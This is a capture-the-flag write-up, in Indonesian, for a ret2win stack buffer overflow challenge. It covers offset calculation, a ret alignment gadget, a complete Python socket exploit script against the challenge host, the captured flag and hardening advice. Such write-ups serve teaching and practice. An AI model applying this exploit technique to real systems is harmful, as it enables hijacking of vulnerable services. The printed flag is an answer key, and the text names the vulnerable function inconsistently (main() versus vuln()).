# 755 - Echo Escape 1 (Binary Exploitation, picoCTF 2026, Medium)

## Challenge Metadata
- ID: 755 | Event: picoCTF 2026 | Author: CyLab Academy
- Category: Binary Exploitation | Difficulty: Medium (2) | Points: 100
- Flag: `academy{3ch0_s3rv1c3_br34k5_7fcd4fec}`

## Problem Statement & Scope
Tantangan mendistribusikan berkas biner ELF 64-bit `vuln` beserta kode sumber `vuln.c`. Layanan target berjalan pada server jaringan jarak jauh yang mengeksekusi biner interaktif penerima input teks. Peserta diminta melakukan analisis kerentanan korupsi memori untuk mengalihkan alur eksekusi proses menuju fungsi `win()` yang mencetak flag resmi.

## Teori & Akar Kerentanan (Root Cause)
1. **Stack-based Buffer Overflow (CWE-121 / CWE-787):**
   Pada fungsi `main()`, alokasi memori lokal untuk array buffer `char buf[32]` dialokasikan sebesar 32 byte pada stack frame (`[rbp - 0x20]`). Fungsi pembacaan input menggunakan `read(0, buf, 128)`:
   ```c
   void vuln() {
       char buf[32];
       read(0, buf, 128);
       write(1, buf, 32);
   }
   ```
   Pemanggilan `read()` meminta pembacaan hingga 128 byte ke dalam buffer berukuran 32 byte. Ini memungkinkan 96 byte kelebihan input menimpa frame pointer (`saved RBP`) dan return address (`saved RIP`).
2. **Mitigasi Biner Non-PIE & No Stack Canary:**
   Inspeksi biner dengan `checksec`:
   - Stack Canary: Tidak aktif (No Canary found).
   - PIE (Position Independent Executable): Non-PIE, base address tetap pada `0x400000`.
   - NX (No-Execute Stack): Aktif (stack tidak dapat mengeksekusi shellcode langsung, mengharuskan Return-Oriented Programming atau ret2win).
3. **Persyaratan Penyelarasan Stack x86_64 ABI (16-Byte Stack Alignment):**
   Sesuai System V AMD64 ABI, sebelum pemanggilan instruksi `call` (termasuk fungsi pustaka `printf`/`fread` di dalam `win()`), stack pointer `rsp` wajib selaras pada batas kelipatan 16 byte (`rsp % 16 == 0`). Pemanggilan langsung menuju fungsi `win()` dapat memicu segmentation fault akibat instruksi SSE (`movaps`). Untuk mengatasinya, gadget perantara `ret` disisipkan sebelum alamat `win()`.

## Rekonstruksi Eksploitasi Step-by-Step
1. **Perhitungan Jarak Offset Stack:**
   - Jarak awal `buf` ke `saved RBP` = 32 byte (`0x20`).
   - Ukuran `saved RBP` (x86_64) = 8 byte.
   - Total padding menuju `saved RIP` = `32 + 8 = 40` byte.
2. **Ekstraksi Alamat Target:**
   - Disassembly `objdump -d -M intel vuln | grep "<win>:"` menghasilkan `0x00401256`.
   - Gadget `ret` tunggal ditemukan pada `0x0040101a`.
3. **Penyusunan Payload Eksploitasi:**
   `payload = b"A" * 40 + p64(0x0040101a) + p64(0x00401256) + b"\n"`
4. **Eksekusi Remote:**
   Koneksi soket TCP menuju container instans CyLab mengirimkan payload, membajak alur kontrol menuju `win()`, dan mengekstrak flag.

## Script Reproduksi & PoC
Implementasi otomasi Python lengkap tersedia pada `scripts/solve_755_echo_escape_1.py`:
```python
import socket, struct

WIN_ADDR = 0x00401256
RET_GADGET = 0x0040101a

payload = b"A" * 40 + struct.pack("<Q", RET_GADGET) + struct.pack("<Q", WIN_ADDR) + b"\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("xebec.cylabacademy.net", 34597))
s.recv(1024)
s.sendall(payload)
print(s.recv(1024).decode())
```

## Mitigasi & Kepatuhan Standar (NIST SP 800-115 / SP 800-53)
- **NIST SP 800-53 SI-16 (Memory Protection):** Wajibkan pengaktifan proteksi Stack Smashing Protector (`-fstack-protector-strong` / `-fstack-protector-all`) dan kompilasi biner dengan Position Independent Executable (`-fPIE -pie`).
- **NIST SP 800-115 Bab 5 (Vulnerability Verification):** Validasi batas input panjang maksimum pada fungsi pembacaan stream; ganti pembacaan berlebih dengan pembatas ketat sesuai kapasitas buffer: `read(0, buf, sizeof(buf) - 1)`.

## Rekap Tim AI (Orkestrasi & Bimbingan LKS)
- **David (Leader):** Menetapkan target eksploitasi ret2win x86_64 dan pembagian tugas verifikasi container instans.
- **Charlie (Trend-hunter):** Mengidentifikasi pola tantangan Binary Exploitation modern picoCTF 2026 yang mempertahankan format klasik ret2win dengan mitigasi stack alignment.
- **Alex (Fullstack-dev) & Omnirush (Executor):** Membangun solver Python interaktif berbasis socket dengan payload p64 dinamis.
- **Julius (QA-engineer):** Memvalidasi penerimaan respons biner, verifikasi status HTTP 201 Created token submission API.
- **Athena (Security-engineer):** Menilai kepatuhan CWE-121 dan pemetaan kontrol NIST SP 800-53 SI-16.
- **Judith (Guru LKS):** Menyusun modul latihan alignment 16-byte SSE x86_64 untuk kurikulum bimbingan teknis LKS Cyber Security Nasional.
